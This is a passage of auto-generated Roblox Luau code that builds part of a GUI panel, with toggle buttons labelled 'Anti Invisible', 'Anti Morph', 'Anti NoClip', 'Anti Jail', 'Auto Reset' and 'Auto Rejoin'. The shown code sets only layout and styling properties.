G2L["213"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["213"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["213"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["213"]["BackgroundTransparency"] = 1;
G2L["213"]["Size"] = UDim2.new(0, 156, 0, 20);
G2L["213"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["213"]["Text"] = [[Anti Invisible]];
G2L["213"]["Name"] = [[text]];
G2L["213"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible.text.UIPadding
G2L["214"] = Instance.new("UIPadding", G2L["213"]);
G2L["214"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible.text.text
G2L["215"] = Instance.new("UIStroke", G2L["213"]);
G2L["215"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible.UIPadding
G2L["216"] = Instance.new("UIPadding", G2L["20c"]);
G2L["216"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph
G2L["217"] = Instance.new("Frame", G2L["1c1"]);
G2L["217"]["BorderSizePixel"] = 0;
G2L["217"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["217"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["217"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["217"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["217"]["Name"] = [[morph]];
G2L["217"]["LayoutOrder"] = 5;
G2L["217"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph.button
G2L["218"] = Instance.new("TextButton", G2L["217"]);
G2L["218"]["BorderSizePixel"] = 0;
G2L["218"]["TextTransparency"] = 1;
G2L["218"]["TextSize"] = 14;
G2L["218"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["218"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["218"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["218"]["BackgroundTransparency"] = 1;
G2L["218"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["218"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["218"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph.button.UIPadding
G2L["219"] = Instance.new("UIPadding", G2L["218"]);
G2L["219"]["PaddingTop"] = UDim.new(0, 3);
G2L["219"]["PaddingRight"] = UDim.new(0, 3);
G2L["219"]["PaddingLeft"] = UDim.new(0, 3);
G2L["219"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph.button.toggleFrame
G2L["21a"] = Instance.new("Frame", G2L["218"]);
G2L["21a"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["21a"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["21a"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["21a"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["21a"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph.button.toggleFrame.outlineStroke
G2L["21b"] = Instance.new("UIStroke", G2L["21a"]);
G2L["21b"]["Thickness"] = 2;
G2L["21b"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph.button.toggleFrame.toggleFade
G2L["21c"] = Instance.new("CanvasGroup", G2L["21a"]);
G2L["21c"]["BorderSizePixel"] = 0;
G2L["21c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["21c"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["21c"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["21c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["21c"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph.button.toggleFrame.toggleFade.UIGradient
G2L["21d"] = Instance.new("UIGradient", G2L["21c"]);
G2L["21d"]["Rotation"] = 90;
G2L["21d"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph.text
G2L["21e"] = Instance.new("TextLabel", G2L["217"]);
G2L["21e"]["TextWrapped"] = true;
G2L["21e"]["BorderSizePixel"] = 0;
G2L["21e"]["TextSize"] = 14;
G2L["21e"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["21e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["21e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["21e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["21e"]["BackgroundTransparency"] = 1;
G2L["21e"]["Size"] = UDim2.new(0, 156, 0, 20);
G2L["21e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["21e"]["Text"] = [[Anti Morph]];
G2L["21e"]["Name"] = [[text]];
G2L["21e"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph.text.UIPadding
G2L["21f"] = Instance.new("UIPadding", G2L["21e"]);
G2L["21f"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph.text.text
G2L["220"] = Instance.new("UIStroke", G2L["21e"]);
G2L["220"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph.UIPadding
G2L["221"] = Instance.new("UIPadding", G2L["217"]);
G2L["221"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip
G2L["222"] = Instance.new("Frame", G2L["1c1"]);
G2L["222"]["BorderSizePixel"] = 0;
G2L["222"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["222"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["222"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["222"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["222"]["Name"] = [[noclip]];
G2L["222"]["LayoutOrder"] = 8;
G2L["222"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip.button
G2L["223"] = Instance.new("TextButton", G2L["222"]);
G2L["223"]["BorderSizePixel"] = 0;
G2L["223"]["TextTransparency"] = 1;
G2L["223"]["TextSize"] = 14;
G2L["223"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["223"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["223"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["223"]["BackgroundTransparency"] = 1;
G2L["223"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["223"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["223"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip.button.UIPadding
G2L["224"] = Instance.new("UIPadding", G2L["223"]);
G2L["224"]["PaddingTop"] = UDim.new(0, 3);
G2L["224"]["PaddingRight"] = UDim.new(0, 3);
G2L["224"]["PaddingLeft"] = UDim.new(0, 3);
G2L["224"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip.button.toggleFrame
G2L["225"] = Instance.new("Frame", G2L["223"]);
G2L["225"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["225"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["225"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["225"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["225"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip.button.toggleFrame.outlineStroke
G2L["226"] = Instance.new("UIStroke", G2L["225"]);
G2L["226"]["Thickness"] = 2;
G2L["226"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip.button.toggleFrame.toggleFade
G2L["227"] = Instance.new("CanvasGroup", G2L["225"]);
G2L["227"]["BorderSizePixel"] = 0;
G2L["227"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["227"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["227"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["227"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["227"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip.button.toggleFrame.toggleFade.UIGradient
G2L["228"] = Instance.new("UIGradient", G2L["227"]);
G2L["228"]["Rotation"] = 90;
G2L["228"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip.text
G2L["229"] = Instance.new("TextLabel", G2L["222"]);
G2L["229"]["TextWrapped"] = true;
G2L["229"]["BorderSizePixel"] = 0;
G2L["229"]["TextSize"] = 14;
G2L["229"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["229"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["229"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["229"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["229"]["BackgroundTransparency"] = 1;
G2L["229"]["Size"] = UDim2.new(0, 156, 0, 20);
G2L["229"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["229"]["Text"] = [[Anti NoClip]];
G2L["229"]["Name"] = [[text]];
G2L["229"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip.text.UIPadding
G2L["22a"] = Instance.new("UIPadding", G2L["229"]);
G2L["22a"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip.text.text
G2L["22b"] = Instance.new("UIStroke", G2L["229"]);
G2L["22b"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip.UIPadding
G2L["22c"] = Instance.new("UIPadding", G2L["222"]);
G2L["22c"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---
G2L["22d"] = Instance.new("Frame", G2L["1c1"]);
G2L["22d"]["BorderSizePixel"] = 0;
G2L["22d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["22d"]["Size"] = UDim2.new(1, 0, 0, 10);
G2L["22d"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["22d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["22d"]["Name"] = [[---DIVIDER---]];
G2L["22d"]["LayoutOrder"] = 6;
G2L["22d"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame
G2L["22e"] = Instance.new("Frame", G2L["22d"]);
G2L["22e"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["22e"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["22e"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["22e"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["22e"]["Name"] = [[dividerFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame.outlineStroke
G2L["22f"] = Instance.new("UIStroke", G2L["22e"]);
G2L["22f"]["Thickness"] = 2;
G2L["22f"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame.buttonFade
G2L["230"] = Instance.new("CanvasGroup", G2L["22e"]);
G2L["230"]["BorderSizePixel"] = 0;
G2L["230"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["230"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["230"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["230"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["230"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame.buttonFade.UIGradient
G2L["231"] = Instance.new("UIGradient", G2L["230"]);
G2L["231"]["Rotation"] = 90;
G2L["231"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame.UIStroke
G2L["232"] = Instance.new("UIStroke", G2L["22e"]);
G2L["232"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["232"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame.UICorner
G2L["233"] = Instance.new("UICorner", G2L["22e"]);



-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.UIPadding
G2L["234"] = Instance.new("UIPadding", G2L["22d"]);
G2L["234"]["PaddingTop"] = UDim.new(0, 3);
G2L["234"]["PaddingRight"] = UDim.new(0, 6);
G2L["234"]["PaddingLeft"] = UDim.new(0, 6);
G2L["234"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.autoresetLABEL
G2L["235"] = Instance.new("Frame", G2L["1c1"]);
G2L["235"]["BorderSizePixel"] = 0;
G2L["235"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["235"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["235"]["Position"] = UDim2.new(0, 0, 0.11875, 0);
G2L["235"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["235"]["Name"] = [[autoresetLABEL]];
G2L["235"]["LayoutOrder"] = 4;
G2L["235"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.autoresetLABEL.text
G2L["236"] = Instance.new("TextLabel", G2L["235"]);
G2L["236"]["TextWrapped"] = true;
G2L["236"]["ZIndex"] = 10;
G2L["236"]["BorderSizePixel"] = 0;
G2L["236"]["TextSize"] = 14;
G2L["236"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["236"]["TextTransparency"] = 0.3;
G2L["236"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["236"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["236"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["236"]["BackgroundTransparency"] = 1;
G2L["236"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["236"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["236"]["Text"] = [[Auto Reset]];
G2L["236"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.autoresetLABEL.text.UIPadding
G2L["237"] = Instance.new("UIPadding", G2L["236"]);
G2L["237"]["PaddingLeft"] = UDim.new(0, 6);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.autoresetLABEL.text.text
G2L["238"] = Instance.new("UIStroke", G2L["236"]);
G2L["238"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.autorejoinLABEL
G2L["239"] = Instance.new("Frame", G2L["1c1"]);
G2L["239"]["BorderSizePixel"] = 0;
G2L["239"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["239"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["239"]["Position"] = UDim2.new(0, 0, 0.11875, 0);
G2L["239"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["239"]["Name"] = [[autorejoinLABEL]];
G2L["239"]["LayoutOrder"] = 6;
G2L["239"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.autorejoinLABEL.text
G2L["23a"] = Instance.new("TextLabel", G2L["239"]);
G2L["23a"]["TextWrapped"] = true;
G2L["23a"]["ZIndex"] = 10;
G2L["23a"]["BorderSizePixel"] = 0;
G2L["23a"]["TextSize"] = 14;
G2L["23a"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["23a"]["TextTransparency"] = 0.3;
G2L["23a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["23a"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["23a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["23a"]["BackgroundTransparency"] = 1;
G2L["23a"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["23a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["23a"]["Text"] = [[Auto Rejoin]];
G2L["23a"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.autorejoinLABEL.text.UIPadding
G2L["23b"] = Instance.new("UIPadding", G2L["23a"]);
G2L["23b"]["PaddingLeft"] = UDim.new(0, 6);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.autorejoinLABEL.text.text
G2L["23c"] = Instance.new("UIStroke", G2L["23a"]);
G2L["23c"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail
G2L["23d"] = Instance.new("Frame", G2L["1c1"]);
G2L["23d"]["BorderSizePixel"] = 0;
G2L["23d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["23d"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["23d"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["23d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["23d"]["Name"] = [[jail]];
G2L["23d"]["LayoutOrder"] = 2;
G2L["23d"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail.button
G2L["23e"] = Instance.new("TextButton", G2L["23d"]);
G2L["23e"]["BorderSizePixel"] = 0;
G2L["23e"]["TextTransparency"] = 1;
G2L["23e"]["TextSize"] = 14;
G2L["23e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["23e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["23e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["23e"]["BackgroundTransparency"] = 1;
G2L["23e"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["23e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["23e"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail.button.UIPadding
G2L["23f"] = Instance.new("UIPadding", G2L["23e"]);
G2L["23f"]["PaddingTop"] = UDim.new(0, 3);
G2L["23f"]["PaddingRight"] = UDim.new(0, 3);
G2L["23f"]["PaddingLeft"] = UDim.new(0, 3);
G2L["23f"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail.button.toggleFrame
G2L["240"] = Instance.new("Frame", G2L["23e"]);
G2L["240"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["240"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["240"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["240"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["240"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail.button.toggleFrame.outlineStroke
G2L["241"] = Instance.new("UIStroke", G2L["240"]);
G2L["241"]["Thickness"] = 2;
G2L["241"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail.button.toggleFrame.toggleFade
G2L["242"] = Instance.new("CanvasGroup", G2L["240"]);
G2L["242"]["BorderSizePixel"] = 0;
G2L["242"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["242"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["242"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["242"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["242"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail.button.toggleFrame.toggleFade.UIGradient
G2L["243"] = Instance.new("UIGradient", G2L["242"]);
G2L["243"]["Rotation"] = 90;
G2L["243"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail.text
G2L["244"] = Instance.new("TextLabel", G2L["23d"]);
G2L["244"]["TextWrapped"] = true;
G2L["244"]["BorderSizePixel"] = 0;
G2L["244"]["TextSize"] = 14;
G2L["244"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["244"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["244"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["244"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["244"]["BackgroundTransparency"] = 1;
G2L["244"]["Size"] = UDim2.new(0, 156, 0, 20);
G2L["244"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["244"]["Text"] = [[Anti Jail]];
G2L["244"]["Name"] = [[text]];
G2L["244"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail.text.UIPadding
G2L["245"] = Instance.new("UIPadding", G2L["244"]);
G2L["245"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail.text.text
G2L["246"] = Instance.new("UIStroke", G2L["244"]);
G2L["246"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail.UIPadding
G2L["247"] = Instance.new("UIPadding", G2L["23d"]);
G2L["247"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.teleport
G2L["248"] = Instance.new("Frame", G2L["1c1"]);
G2L["248"]["BorderSizePixel"] = 0;
G2L["248"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["248"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["248"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["248"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["248"]["Name"] = [[teleport]];
G2L["248"]["LayoutOrder"] = 2;
G2L["248"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.teleport.button
G2L["249"] = Instance.new("TextButton", G2L["248"]);
G2L["249"]["BorderSizePixel"] = 0;
G2L["249"]["TextTransparency"] = 1;
G2L["249"]["TextSize"] = 14;
G2L["249"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["249"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["249"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["249"]["BackgroundTransparency"] = 1;
G2L["249"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["249"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["249"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.teleport.button.UIPadding
G2L["24a"] = Instance.new("UIPadding", G2L["249"]);
G2L["24a"]["PaddingTop"] = UDim.new(0, 3);
G2L["24a"]["PaddingRight"] = UDim.new(0, 3);
G2L["24a"]["PaddingLeft"] = UDim.new(0, 3);
G2L["24a"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.teleport.button.toggleFrame
G2L["24b"] = Instance.new("Frame", G2L["249"]);
G2L["24b"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["24b"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["24b"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["24b"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["24b"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.teleport.button.toggleFrame.outlineStroke
G2L["24c"] = Instance.new("UIStroke", G2L["24b"]);
G2L["24c"]["Thickness"] = 2;
G2L["24c"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.teleport.button.toggleFrame.toggleFade
G2L["24d"] = Instance.new("CanvasGroup", G2L["24b"]);
G2L["24d"]["BorderSizePixel"] = 0;
G2L["24d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["24d"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["24d"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["24d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["24d"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.teleport.button.toggleFrame.toggleFade.UIGradient
G2L["24e"] = Instance.new("UIGradient", G2L["24d"]);
G2L["24e"]["Rotation"] = 90;
G2L["24e"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.teleport.text
G2L["24f"] = Instance.new("TextLabel", G2L["248"]);
G2L["24f"]["TextWrapped"] = true;
G2L["24f"]["BorderSizePixel"] = 0;
G2L["24f"]["TextSize"] = 14;
G2L["24f"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["24f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["24f"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["24f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["24f"]["BackgroundTransparency"] = 1;
G2L["24f"]["Size"] = UDim2.new(0, 156, 0, 20);
G2L["24f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
